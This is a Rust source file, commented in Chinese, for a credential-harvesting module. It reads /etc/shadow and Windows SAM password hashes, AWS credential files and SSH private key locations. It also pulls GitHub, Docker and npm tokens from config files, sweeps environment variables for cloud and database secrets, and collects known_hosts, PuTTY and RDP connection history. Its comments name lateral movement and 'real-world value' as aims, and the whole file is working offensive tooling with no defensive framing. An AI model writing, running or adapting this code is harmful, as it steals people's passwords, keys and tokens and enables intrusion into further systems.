//! 凭据收集模块
//!
//! 收集密码哈希、令牌、SSH 密钥、API 密钥等凭据信息

use serde::{Deserialize, Serialize};

/// 凭据收集器
pub struct CredentialCollector;

impl CredentialCollector {
    /// 创建新的凭据收集器
    pub fn new() -> Self {
        Self
    }

    /// 收集密码哈希
    pub fn collect_password_hashes(&self) -> Vec<HashEntry> {
        let mut hashes = Vec::new();

        // Windows SAM 文件路径
        #[cfg(windows)]
        hashes.extend(self.collect_windows_hashes());

        // Linux shadow 文件
        #[cfg(unix)]
        hashes.extend(self.collect_unix_hashes());

        hashes
    }

    /// 收集令牌
    pub fn collect_tokens(&self) -> Vec<Token> {
        let mut tokens = Vec::new();

        // 搜索可能包含令牌的文件
        let token_paths = vec![
            "/root/.aws/credentials",
            "/home/*/.aws/credentials",
            "C:\\Users\\*\\.aws\\credentials",
        ];

        for pattern in token_paths {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(content) = std::fs::read_to_string(&path) {
                        if content.contains("aws_access_key_id") || content.contains("aws_secret_access_key") {
                            let display_content = self.extract_aws_credentials(&content);
                            tokens.push(Token {
                                token_type: "AWS".to_string(),
                                location: path.to_string_lossy().to_string(),
                                content: display_content,
                            });
                        }
                    }
                }
            }
        }

        tokens
    }

    /// 收集 SSH 密钥
    pub fn collect_ssh_keys(&self) -> Vec<SshKey> {
        let mut keys = Vec::new();

        // 搜索 SSH 密钥
        let key_patterns = vec![
            "/root/.ssh/id_*",
            "/home/*/.ssh/id_*",
            "C:\\Users\\*\\.ssh\\id_*",
        ];

        for pattern in key_patterns {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(metadata) = std::fs::metadata(&path) {
                        if metadata.is_file() {
                            let filename = path.file_name().unwrap_or_default().to_string_lossy().to_string();
                            if !filename.ends_with(".pub") {
                                let fingerprint = self.compute_ssh_fingerprint(&path);
                                keys.push(SshKey {
                                    key_type: self.detect_key_type(&filename),
                                    path: path.to_string_lossy().to_string(),
                                    fingerprint,
                                });
                            }
                        }
                    }
                }
            }
        }

        keys
    }

    /// 收集 API 密钥
    pub fn collect_api_keys(&self) -> Vec<ApiKey> {
        let mut keys = Vec::new();

        // 搜索可能包含 API 密钥的文件
        let search_patterns = vec![
            // GitHub/GitLab
            "/home/*/.gitconfig",
            "C:\\Users\\*\\.gitconfig",
            // 各种配置文件
            "/home/*/.netrc",
            "C:\\Users\\*\\.netrc",
            // Docker 配置
            "/root/.docker/config.json",
            "C:\\Users\\*\\.docker\\config.json",
            // npm 配置
            "/home/*/.npmrc",
            "C:\\Users\\*\\.npmrc",
        ];

        for pattern in search_patterns {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(content) = std::fs::read_to_string(&path) {
                        // 检测 GitHub token
                        if content.contains("github") && (content.contains("oauth") || content.contains("token")) {
                            let extracted = extract_token_value(&content, &["token", "oauth"]);
                            keys.push(ApiKey {
                                service: "GitHub".to_string(),
                                location: path.to_string_lossy().to_string(),
                                redacted: extracted.is_none(),
                                key_value: extracted,
                            });
                        }
                        // 检测 AWS keys
                        if content.contains("AKIA") {
                            let akia = extract_aws_key_id(&content);
                            keys.push(ApiKey {
                                service: "AWS".to_string(),
                                location: path.to_string_lossy().to_string(),
                                redacted: akia.is_none(),
                                key_value: akia,
                            });
                        }
                        // 检测 Docker 认证
                        if content.contains("\"auth\"") {
                            let docker_auth = extract_docker_auth(&content);
                            keys.push(ApiKey {
                                service: "Docker".to_string(),
                                location: path.to_string_lossy().to_string(),
                                redacted: docker_auth.is_none(),
                                key_value: docker_auth,
                            });
                        }
                        // 检测 npm token
                        if content.contains("//registry") && content.contains(":_authToken=") {
                            let npm_token = extract_npm_token(&content);
                            keys.push(ApiKey {
                                service: "npm".to_string(),
                                location: path.to_string_lossy().to_string(),
                                redacted: npm_token.is_none(),
                                key_value: npm_token,
                            });
                        }
                    }
                }
            }
        }

        keys
    }

    /// 收集环境变量中的敏感凭据（云密钥、数据库密码、token 等）
    ///
    /// 扫描当前进程环境变量，匹配常见密钥名。这类凭据常驻留在 CI/CD 容器、
    /// 云函数、应用进程中，实战价值高。结果以 Token 形式返回（与文件令牌合并统计）。
    pub fn collect_env_secrets(&self) -> Vec<Token> {
        // 常见敏感环境变量名（大小写不敏感的子串匹配）
        const SECRET_PATTERNS: &[&str] = &[
            "AWS_SECRET_ACCESS_KEY",
            "AWS_ACCESS_KEY_ID",
            "AZURE_CLIENT_SECRET",
            "AZURE_STORAGE_KEY",
            "GOOGLE_APPLICATION_CREDENTIALS",
            "GCP_SERVICE_ACCOUNT",
            "GITHUB_TOKEN",
            "GH_TOKEN",
            "GITLAB_TOKEN",
            "DATABASE_URL",
            "DB_PASSWORD",
            "MYSQL_PASSWORD",
            "POSTGRES_PASSWORD",
            "REDIS_PASSWORD",
            "MONGO_PASSWORD",
            "PRIVATE_KEY",
            "SECRET_KEY",
            "ACCESS_TOKEN",
            "NPM_TOKEN",
            "DOCKER_PASSWORD",
            "SLACK_TOKEN",
        ];

        let mut tokens = Vec::new();
        for (key, value) in std::env::vars() {
            if value.is_empty() {
                continue;
            }
            let upper = key.to_uppercase();
            if SECRET_PATTERNS.iter().any(|p| upper.contains(p)) {
                tokens.push(Token {
                    token_type: "ENV".to_string(),
                    location: format!("env:{}", key),
                    content: value,
                });
            }
        }

        tokens
    }

    /// 收集 SSH known_hosts（揭示操作者连接过的内网主机，是横向移动的重要线索）
    pub fn collect_known_hosts(&self) -> Vec<KnownHost> {
        let patterns = vec![
            "/root/.ssh/known_hosts",
            "/home/*/.ssh/known_hosts",
            "C:\\Users\\*\\.ssh\\known_hosts",
        ];

        let mut entries = Vec::new();
        for pattern in patterns {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(content) = std::fs::read_to_string(&path) {
                        let hosts: Vec<String> = content
                            .lines()
                            .filter_map(|line| {
                                let line = line.trim();
                                if line.is_empty() || line.starts_with('#') {
                                    return None;
                                }
                                // known_hosts 格式: host[,host...] [keytype] key [comment]
                                line.split_whitespace().next().map(|s| s.to_string())
                            })
                            .collect();
                        if !hosts.is_empty() {
                            entries.push(KnownHost {
                                path: path.to_string_lossy().to_string(),
                                hosts,
                            });
                        }
                    }
                }
            }
        }

        entries
    }

    /// 收集 PuTTY 保存的会话（Windows 注册表）
    ///
    /// HKCU\Software\SimonTatham\PuTTY\Sessions\<name> 下的 HostName/UserName。
    pub fn collect_putty_sessions(&self) -> Vec<RemoteSession> {
        #[cfg(windows)]
        {
            use winreg::enums::*;
            use winreg::RegKey;

            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
            let mut sessions = Vec::new();
            if let Ok(sess_root) =
                hkcu.open_subkey_with_flags("Software\\SimonTatham\\PuTTY\\Sessions", KEY_READ)
            {
                for name in sess_root.enum_keys().filter_map(|k| k.ok()) {
                    if let Ok(sess) = sess_root.open_subkey_with_flags(&name, KEY_READ) {
                        let host: String = sess.get_value("HostName").unwrap_or_default();
                        let username: String = sess.get_value("UserName").unwrap_or_default();
                        if !host.is_empty() {
                            sessions.push(RemoteSession {
                                source: "PuTTY".to_string(),
                                host,
                                username: if username.is_empty() {
                                    None
                                } else {
                                    Some(username)
                                },
                            });
                        }
                    }
                }
            }
            sessions
        }
        #[cfg(not(windows))]
        {
            Vec::new()
        }
    }

    /// 收集 RDP 连接历史（Windows 注册表）
    ///
    /// HKCU\Software\Microsoft\Terminal Server Client\Servers\<host> 的 UsernameHint。
    pub fn collect_rdp_history(&self) -> Vec<RemoteSession> {
        #[cfg(windows)]
        {
            use winreg::enums::*;
            use winreg::RegKey;

            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
            let mut sessions = Vec::new();
            if let Ok(servers_root) = hkcu
                .open_subkey_with_flags(
                    "Software\\Microsoft\\Terminal Server Client\\Servers",
                    KEY_READ,
                )
            {
                for host in servers_root.enum_keys().filter_map(|k| k.ok()) {
                    if let Ok(server) = servers_root.open_subkey_with_flags(&host, KEY_READ) {
                        let username: String = server.get_value("UsernameHint").unwrap_or_default();
                        sessions.push(RemoteSession {
                            source: "RDP".to_string(),
                            host,
                            username: if username.is_empty() {
                                None
                            } else {
                                Some(username)
                            },
                        });
                    }
                }
            }
            sessions
        }
        #[cfg(not(windows))]
        {
            Vec::new()
        }
    }

    /// Windows: 收集 Windows 密码哈希
    #[cfg(windows)]
    fn collect_windows_hashes(&self) -> Vec<HashEntry> {
        let mut hashes = Vec::new();

        // 检查是否有管理员权限
        let is_admin = self.check_admin_privilege();

        if !is_admin {
            hashes.push(HashEntry {
                hash_type: "SAM".to_string(),
                location: "C:\\Windows\\System32\\config\\SAM".to_string(),
                username: "[SYSTEM]".to_string(),
                hash: "[ACCESS DENIED - 需要管理员权限]".to_string(),
            });
            return hashes;
        }

        // 尝试通过注册表读取 SAM
        match self.read_sam_hashes() {
            Ok(sam_hashes) => hashes.extend(sam_hashes),
            Err(e) => {
                hashes.push(HashEntry {
                    hash_type: "SAM".to_string(),
                    location: "C:\\Windows\\System32\\config\\SAM".to_string(),
                    username: "[ERROR]".to_string(),
                    hash: format!("[读取失败: {}]", e),
                });
            }
        }

        hashes
    }

    /// Unix: 收集 Unix 密码哈希
    #[cfg(unix)]
    fn collect_unix_hashes(&self) -> Vec<HashEntry> {
        let mut hashes = Vec::new();

        // 尝试读取 /etc/shadow（需要 root 权限）
        if let Ok(content) = std::fs::read_to_string("/etc/shadow") {
            for line in content.lines() {
                if line.starts_with('#') || line.is_empty() {
                    continue;
                }

                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 3 {
                    hashes.push(HashEntry {
                        hash_type: "shadow".to_string(),
                        location: "/etc/shadow".to_string(),
                        username: parts[0].to_string(),
                        hash: if !parts[1].is_empty() && parts[1] != "x" && parts[1] != "*" {
                            format!("{}:{}", parts[0], parts[1])
                        } else {
                            "[LOCKED]".to_string()
                        },
                    });
                }
            }
        }

        hashes
    }

    /// 检测 SSH 密钥类型
    fn detect_key_type(&self, filename: &str) -> String {
        if filename.contains("rsa") {
            "RSA".to_string()
        } else if filename.contains("ed25519") {
            "Ed25519".to_string()
        } else if filename.contains("ecdsa") {
            "ECDSA".to_string()
        } else if filename.contains("dsa") {
            "DSA".to_string()
        } else {
            "Unknown".to_string()
        }
    }

    /// 从 AWS credentials 文件中提取凭据
    fn extract_aws_credentials(&self, content: &str) -> String {
        let mut access_key = String::new();
        let mut secret_key = String::new();

        for line in content.lines() {
            let line = line.trim();
            if line.starts_with('#') || line.is_empty() || line.starts_with('[') {
                continue;
            }
            if let Some((key, value)) = line.split_once('=') {
                let key = key.trim();
                let value = value.trim();
                match key {
                    "aws_access_key_id" => access_key = value.to_string(),
                    "aws_secret_access_key" => secret_key = value.to_string(),
                    _ => {}
                }
            }
        }

        if !access_key.is_empty() && !secret_key.is_empty() {
            format!("{}:{}", access_key, secret_key)
        } else if !access_key.is_empty() {
            format!("{}:[未找到secret_key]", access_key)
        } else if !secret_key.is_empty() {
            format!("[未找到access_key]:{}", secret_key)
        } else {
            "[未提取到凭据]".to_string()
        }
    }

    /// 计算 SSH 密钥指纹（读取对应的 .pub 文件）
    fn compute_ssh_fingerprint(&self, key_path: &std::path::Path) -> Option<String> {
        let pub_path = key_path.with_extension("pub");
        let pub_content = std::fs::read_to_string(&pub_path).ok()?;

        // SSH 公钥格式: ssh-rsa AAAA... user@host
        let parts: Vec<&str> = pub_content.split_whitespace().collect();
        if parts.len() < 2 {
            return None;
        }

        // 解码 base64 密钥数据
        use base64::prelude::*;
        let decoded = BASE64_STANDARD.decode(parts[1]).ok()?;

        // SHA-256 哈希
        use sha2::{Sha256, Digest};
        let hash = Sha256::digest(&decoded);

        // 编码为 base64 并去掉末尾 '='
        let b64 = BASE64_STANDARD.encode(hash);
        let trimmed = b64.trim_end_matches('=');

        Some(format!("SHA256:{}", trimmed))
    }

    /// 检查是否有管理员权限 (Windows)
    #[cfg(windows)]
    fn check_admin_privilege(&self) -> bool {
        // 尝试打开 SAM 注册表键来检查权限
        use winreg::enums::*;
        use winreg::RegKey;

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        // 尝试打开 SAM 键，如果成功说明有足够权限
        hklm.open_subkey_with_flags("SAM\\SAM", KEY_READ).is_ok()
    }

    /// 读取 SAM 哈希 (Windows)
    #[cfg(windows)]
    fn read_sam_hashes(&self) -> Result<Vec<HashEntry>, String> {
        use winreg::enums::*;
        use winreg::RegKey;

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        let sam_key = hklm
            .open_subkey_with_flags("SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
            .map_err(|e| format!("无法打开 SAM 注册表键: {}", e))?;

        let mut hashes = Vec::new();

        // 读取用户 RID 列表
        for subkey_name in sam_key.enum_keys().filter_map(|k| k.ok()) {
            // 跳过 Names 子键和非 RID 键
            if subkey_name == "Names" || subkey_name.len() != 8 {
                continue;
            }

            // 解析 RID
            let rid = u32::from_str_radix(&subkey_name, 16).unwrap_or(0);
            // 跳过内置账户 (RID < 1000)
            if !(1000..=0xFFFF).contains(&rid) {
                continue;
            }

            if let Ok(user_key) = sam_key.open_subkey_with_flags(&subkey_name, KEY_READ) {
                // 读取 V 值 (用户信息二进制数据)
                if let Ok(v_data) = user_key.get_raw_value("V") {
                    // 尝试从 V 数据中提取用户名和哈希
                    if let Some((username, hash_str)) = parse_sam_v_value(&v_data.bytes) {
                        hashes.push(HashEntry {
                            hash_type: "NTLM".to_string(),
                            location: format!("HKLM\\SAM\\SAM\\Domains\\Account\\Users\\{}", subkey_name),
                            username,
                            hash: hash_str,
                        });
                    }
                }
            }
        }

        // 同时通过 Names 子键获取用户名映射
        let names_key = sam_key.open_subkey_with_flags("Names", KEY_READ);
        if let Ok(names_key) = names_key {
            for name in names_key.enum_keys().filter_map(|k| k.ok()) {
                // 检查是否已经在 hashes 中
                if !hashes.iter().any(|h| h.username == name) {
                    if let Ok(name_key) = names_key.open_subkey_with_flags(&name, KEY_READ) {
                        let rid: u32 = name_key.get_value("").unwrap_or(0);
                        hashes.push(HashEntry {
                            hash_type: "NTLM".to_string(),
                            location: format!("HKLM\\SAM\\SAM\\Domains\\Account\\Users\\{:08X}", rid),
                            username: name,
                            hash: "[需要SYSTEM权限解密哈希]".to_string(),
                        });
                    }
                }
            }
        }

        if hashes.is_empty() {
            hashes.push(HashEntry {
                hash_type: "SAM".to_string(),
                location: "C:\\Windows\\System32\\config\\SAM".to_string(),
                username: "[INFO]".to_string(),
                hash: "发现 SAM 数据库但未能提取哈希（可能需要 SYSTEM 权限）".to_string(),
            });
        }

        Ok(hashes)
    }
}

// ==================== 辅助函数 ====================

/// 从文本中提取 token 值
fn extract_token_value(content: &str, keywords: &[&str]) -> Option<String> {
    for line in content.lines() {
        let line = line.trim();
        for keyword in keywords {
            if line.contains(keyword) {
                // 尝试多种分隔符
                if let Some(value) = line.split('=').nth(1)
                    .or_else(|| line.split(':').nth(1))
                    .or_else(|| line.split_whitespace().nth(1))
                {
                    let val = value.trim()
                        .trim_matches('"')
                        .trim_matches('\'')
                        .trim();
                    if !val.is_empty() && val != "true" && val != "false" && val.len() > 3 {
                        return Some(val.to_string());
                    }
                }
            }
        }
    }
    None
}

/// 提取 AWS Access Key ID (以 AKIA 开头的 20 字符字符串)
fn extract_aws_key_id(content: &str) -> Option<String> {
    // AKIA 开头，后跟 16 个大写字母/数字
    for (i, _) in content.match_indices("AKIA") {
        if i + 20 <= content.len() {
            let key = &content[i..i + 20];
            if key.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit()) {
                return Some(key.to_string());
            }
        }
    }
    None
}

/// 提取 Docker 认证信息
fn extract_docker_auth(content: &str) -> Option<String> {
    // Docker config.json 格式: "auth": "base64(user:pass)"
    for line in content.lines() {
        if line.contains("\"auth\"") {
            if let Some(value) = line.split(':').nth(1) {
                let val = value.trim()
                    .trim_matches('"')
                    .trim_matches(',')
                    .trim();
                if !val.is_empty() && val != "{}" {
                    return Some(format!("auth={}", val));
                }
            }
        }
    }
    None
}

/// 提取 npm token
fn extract_npm_token(content: &str) -> Option<String> {
    for line in content.lines() {
        if line.contains(":_authToken=") {
            if let Some(value) = line.split("_authToken=").nth(1) {
                let val = value.trim();
                if !val.is_empty() {
                    return Some(val.to_string());
                }
            }
        }
    }
    None
}

/// 解析 SAM V 值二进制数据
///
/// 从 SAM 注册表的 V 值中提取用户名和 NTLM 哈希
/// 注意: 完整的哈希解密需要 SYSTEM hive 中的 SYSKEY
#[cfg(windows)]
fn parse_sam_v_value(v_data: &[u8]) -> Option<(String, String)> {
    if v_data.len() < 0xCC {
        return None;
    }

    // V 值结构:
    // offset 0x0C: 用户名偏移 (u16)
    // offset 0x10: 用户名长度 (u16)
    // ...（其他字段）
    // 实际数据在固定头部之后

    let name_offset = u16::from_le_bytes([v_data[0x0C], v_data[0x0D]]) as usize;
    let name_length = u16::from_le_bytes([v_data[0x10], v_data[0x11]]) as usize;

    // 提取用户名 (UTF-16LE)
    if name_offset + name_length <= v_data.len() && name_length > 0 {
        let name_bytes = &v_data[name_offset..name_offset + name_length];
        let username = String::from_utf16(
            &name_bytes.chunks(2)
                .map(|chunk| {
                    if chunk.len() == 2 {
                        u16::from_le_bytes([chunk[0], chunk[1]])
                    } else {
                        0
                    }
                })
                .collect::<Vec<u16>>()
        ).unwrap_or_else(|_| "[DECODE_ERROR]".to_string());

        // NTLM 哈希在 V 值的固定位置（需要 SYSKEY 解密）
        // 这里仅标记需要解密
        return Some((username, "[需要SYSTEM权限解密NTLM哈希]".to_string()));
    }

    None
}

impl Default for CredentialCollector {
    fn default() -> Self {
        Self::new()
    }
}

// ==================== 数据结构 ====================

/// 密码哈希条目
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HashEntry {
    pub hash_type: String,
    pub location: String,
    pub username: String,
    pub hash: String,
}

/// 令牌信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Token {
    pub token_type: String,
    pub location: String,
    pub content: String,
}

/// SSH 密钥
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshKey {
    pub key_type: String,
    pub path: String,
    pub fingerprint: Option<String>,
}

/// API 密钥
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiKey {
    pub service: String,
    pub location: String,
    pub redacted: bool,
    /// 实际提取到的密钥值（如果成功提取）
    #[serde(default)]
    pub key_value: Option<String>,
}

/// SSH known_hosts 条目（揭示操作者连接过的主机，横向移动线索）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KnownHost {
    /// known_hosts 文件路径
    pub path: String,
    /// 连接过的主机列表（每行第一个字段，可能含逗号分隔的多个主机/IP）
    pub hosts: Vec<String>,
}

/// 远程连接历史（PuTTY session / RDP 历史）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemoteSession {
    /// 来源："PuTTY" / "RDP"
    pub source: String,
    /// 主机地址
    pub host: String,
    /// 用户名（如有）
    pub username: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_credential_collector_creation() {
        let collector = CredentialCollector::new();
        assert!(true);
    }

    #[test]
    fn test_collect_password_hashes() {
        let collector = CredentialCollector::new();
        let _hashes = collector.collect_password_hashes();
        assert!(true);
    }

    #[test]
    fn test_collect_tokens() {
        let collector = CredentialCollector::new();
        let _tokens = collector.collect_tokens();
        assert!(true);
    }

    #[test]
    fn test_collect_ssh_keys() {
        let collector = CredentialCollector::new();
        let _keys = collector.collect_ssh_keys();
        assert!(true);
    }

    #[test]
    fn test_collect_api_keys() {
        let collector = CredentialCollector::new();
        let _keys = collector.collect_api_keys();
        assert!(true);
    }

    #[test]
    fn test_detect_key_type() {
        let collector = CredentialCollector::new();
        assert_eq!(collector.detect_key_type("id_rsa"), "RSA");
        assert_eq!(collector.detect_key_type("id_ed25519"), "Ed25519");
        assert_eq!(collector.detect_key_type("id_ecdsa"), "ECDSA");
        assert_eq!(collector.detect_key_type("id_dsa"), "DSA");
        assert_eq!(collector.detect_key_type("id_unknown"), "Unknown");
    }

    #[test]
    fn test_extract_aws_credentials() {
        let collector = CredentialCollector::new();
        let content = "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n";
        let result = collector.extract_aws_credentials(content);
        assert!(result.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(result.contains("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"));
    }

    #[test]
    fn test_extract_aws_credentials_partial() {
        let collector = CredentialCollector::new();
        let content = "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\n";
        let result = collector.extract_aws_credentials(content);
        assert!(result.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(result.contains("未找到secret_key"));
    }

    #[test]
    fn test_extract_aws_key_id() {
        let content = "some text AKIAIOSFODNN7EXAMPLE more text";
        let result = extract_aws_key_id(content);
        assert_eq!(result, Some("AKIAIOSFODNN7EXAMPLE".to_string()));
    }

    #[test]
    fn test_extract_aws_key_id_not_found() {
        let content = "some text without aws key";
        let result = extract_aws_key_id(content);
        assert_eq!(result, None);
    }

    #[test]
    fn test_extract_token_value() {
        let content = "[github]\ntoken = ghp_abc123def456\n";
        let result = extract_token_value(content, &["token"]);
        assert_eq!(result, Some("ghp_abc123def456".to_string()));
    }

    #[test]
    fn test_extract_npm_token() {
        let content = "//registry.npmjs.org/:_authToken=npm_deadbeef1234\n";
        let result = extract_npm_token(content);
        assert_eq!(result, Some("npm_deadbeef1234".to_string()));
    }
}
